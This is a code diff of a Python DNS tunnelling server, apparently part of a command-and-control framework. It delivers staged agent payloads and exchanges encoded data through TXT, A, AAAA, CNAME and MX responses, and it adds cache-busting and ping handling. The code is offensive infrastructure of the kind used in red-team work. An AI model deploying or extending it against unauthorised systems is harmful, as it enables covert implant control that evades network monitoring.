@@ -6,7 +6,7 @@ import threading
 import math
 
 from syhelpers.dataqueue import DataQueue
-from syhelpers.encoding import dnsdecode, dnsencode, lenofb64decoded, ipencode
+from syhelpers.encoding import dnshostdecode, dnstxtencode, lenofb64decoded, dnsip4encode, dnshostencode, dnsip6encode
 from syhelpers.types import isportnumber, isint
 from .transport import Transport
 from syhelpers.log import *
@@ -23,6 +23,11 @@ class TransportDns (Transport, ModuleBase):
 
     # noinspection PyMissingConstructor
     def __init__(self, handler):
+        """
+        initializese the module
+        :param handler: backreference to syssspy handler object
+        """
+
         self.options = {
             'ZONE' : {
                 'Description'   :   'DNS Zone for handling requests',
@@ -186,7 +191,7 @@ class TransportDns (Transport, ModuleBase):
         """
         receive data from connected host
         :param leng: length of data to collect
-        :return: None
+        :return: data
         """
 
         if not self.server:
@@ -277,12 +282,12 @@ class TransportDns (Transport, ModuleBase):
 
         # create progress bar if selected
         if self.progress is None and self.options['PROGRESSBAR']['Value'] == "TRUE" \
-                and DEBUG_MODULE not in DEBUG_MODULES:
+                and isactivated(DEBUG_MODULE):
             import progressbar
             self.progress = progressbar.ProgressBar(0, self.maxstagenum)
 
         # print progress either in debug line or as progressbar (if selected)
-        if DEBUG_MODULE in DEBUG_MODULES:
+        if isactivated(DEBUG_MODULE):
             print_debug(DEBUG_MODULE, "Sending staged agent part {} of {}".format(self.currentstagenum,
                                                                                   self.maxstagenum))
         elif self.progress is not None:
@@ -295,6 +300,16 @@ class TransportDns (Transport, ModuleBase):
         self.currentstagenum += 1
         self.laststagepart = nextdata
         return nextdata
+
+    def serve_ping(self, pingdata):
+        """
+        should serve a pong response valid for the encoding DNS type
+        :param pingdata: b'pingquery' usually
+        :return: b'pong' or something alike
+        """
+
+        # TODO: remember to match strange encoding for DNS types
+        return b'pong'
 
 
 class DnsHandler(socketserver.BaseRequestHandler):
@@ -312,6 +327,8 @@ class DnsHandler(socketserver.BaseRequestHandler):
 
         self.zone = self.transport.options["ZONE"]["Value"].rstrip(".")
         self.stagerrequest = False
+        self.dnstype = None
+
         print_debug(DEBUG_MODULE, "zone = " + str(self.zone))
         super().__init__(request, client_address, server)
 
@@ -334,32 +351,48 @@ class DnsHandler(socketserver.BaseRequestHandler):
         # strip zone and remove all dots
         q = str(queryname).rstrip(".").rstrip(self.zone).replace(".", "")
 
+        # remove random part (used to avoid DNS caching issues)
+        q2, r = q.rsplit("r", maxsplit=1)
+        if not r or not isint(r):
+            q2, r = q.rsplit("R", maxsplit=1)
+            if not r or not isint(r):
+                print_error("stripping the random part from DNS query failed, ignoring this query")
+                return None
+        q = q2
+
         #print_debug(DEBUG_MODULE, "q = {}, q.startswith('s') = {}, q.strip('s').isdigit() = {}".format(
         #    q, q.startswith('s'), q.strip('s').isdigit()))
 
-        if q.startswith("s") and q.split("r")[0].strip("s").isdigit():  # stager request
+        if q.startswith("s") and q.strip("s").isdigit():  # stager request
             self.stagerrequest = True
-            return int(q.split("r")[0].strip("s"))  # we will not decode it further
+            return int(q.strip("s"))  # we will not decode it further
 
         # otherwise we expect a fully enrolled agent on the other side and decode
         try:
-            return dnsdecode(q)
+            return dnshostdecode(q)
         except binascii.Error:
             return None
 
-    def _encode_response(self, rdata):
+    def _encode_response(self, rdata, dnstype):
         """
-        encodes the response data to a form we can include in a DNS response
+        encodes the response data to a form we can include in a DNS response of the given type
         :param rdata: data to include
+        :param dnstype: type to use for response, e.g. dns.rdatatype.TXT
         :return: encoded data
         """
 
-        if self.transport.options['DNSTYPE']['Value'] == "TXT":
-            return dnsencode(rdata)
-        elif self.transport.options['DNSTYPE']['Value'] == "A":
-            return ipencode(rdata)
+        if dnstype is dns.rdatatype.TXT:
+            return dnstxtencode(rdata)
+        elif dnstype is dns.rdatatype.A:
+            return dnsip4encode(rdata)
+        elif dnstype is dns.rdatatype.CNAME:
+            return dnshostencode(rdata, self.zone)
+        elif dnstype is dns.rdatatype.MX:
+            return b'10 ' + dnshostencode(rdata, self.zone)
+        elif dnstype is dns.rdatatype.AAAA:
+            return dnsip6encode(rdata)
         else:
-            print_error("invalied DNSTYPE")
+            print_error("invalid DNSTYPE for encoding requested: {}".format(dnstype))
             return None
 
     def _get_response(self, qtext):
@@ -372,20 +405,30 @@ class DnsHandler(socketserver.BaseRequestHandler):
         if self.stagerrequest:  # stager request
             return self.transport.serve_stage(qtext)
 
+        if qtext == b'pingquery':
+            return self.transport.serve_ping(qtext)
+
         return qtext  # TODO: for now we just reply
 
     def _dns_type(self):
         """
-        Should return the DNS response data type needed, TXT or A
-        :return: dns.rdatatype.TXT or dns.rdatatype.A
+        Should return the DNS response data type needed, TXT or A for stager or anything we support else
+        :return: dns.rdatatype.TXT or dns.rdatatype.A or other
         """
-        if self.transport.options['DNSTYPE']['Value'] == "TXT":
-            return dns.rdatatype.TXT
-        elif self.transport.options['DNSTYPE']['Value'] == "A":
-            return dns.rdatatype.A
+
+        if self.stagerrequest:
+            if self.transport.options['DNSTYPE']['Value'] == "TXT":
+                return dns.rdatatype.TXT
+            elif self.transport.options['DNSTYPE']['Value'] == "A":
+                return dns.rdatatype.A
+            else:
+                print_error("invalid DNSTYPE")
+                return None
+
+        # if not staging, we can be more creative
         else:
-            print_error("invalied DNSTYPE")
-            return None
+            return self.dnstype
+
 
     def handle(self):
         """
@@ -412,10 +455,11 @@ class DnsHandler(socketserver.BaseRequestHandler):
             print_debug(DEBUG_MODULE, "query from {}: {}".format(self.client_address[0], str(q)))
 
             if "IN PTR" in str(q):
-                ptrquery = True
+                self.dnstype = dns.rdatatype.PTR
                 qtext = str(q.name)
 
             elif not self._is_in_zone(q.name):
+                self.dnstype = None
                 print_error("ignoring query outsite of our zone: " + str(q))
                 continue
 
@@ -426,19 +470,35 @@ class DnsHandler(socketserver.BaseRequestHandler):
                     continue
                 print_debug(DEBUG_MODULE, "decoded qtext = {}".format(qtext))
 
+                if "IN TXT" in str(q):
+                    self.dnstype = dns.rdatatype.TXT
+                elif "IN MX" in str(q):
+                    self.dnstype = dns.rdatatype.MX
+                elif "IN CNAME" in str(q):
+                    self.dnstype = dns.rdatatype.CNAME
+                elif "IN AAAA" in str(q):
+                    self.dnstype = dns.rdatatype.AAAA
+                elif "IN A" in str(q):
+                    self.dnstype = dns.rdatatype.A
+                else:
+                    self.dnstype = None
+
             resp = dns.message.make_response(msg)
             resp.flags |= dns.flags.AA
             resp.set_rcode(0)
             if resp:
-                if not ptrquery:
+                if self.dnstype is not dns.rdatatype.PTR:
                     data = self._get_response(qtext)
                     if data:
-                        data = self._encode_response(data)
                         dnstype = self._dns_type()
-                        print_debug(DEBUG_MODULE, "responding with: {}".format(str(data, 'utf-8')))
-                        resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, dnstype,
+                        data = self._encode_response(data, dnstype)
+                        if data:
+                            print_debug(DEBUG_MODULE, "responding with: {}".format(str(data, 'utf-8')))
+                            resp.answer.append(dns.rrset.from_text(q.name, 7600, dns.rdataclass.IN, dnstype,
                                                                str(data, 'utf-8')))
-                        socket.sendto(resp.to_wire(), self.client_address)
+                            socket.sendto(resp.to_wire(), self.client_address)
+                        else:
+                            print_debug(DEBUG_MODULE, "no data to respond after encoding, ignoring query")
                     else:
                         print_debug(DEBUG_MODULE, "no data to respond, ignoring query")
                 else:
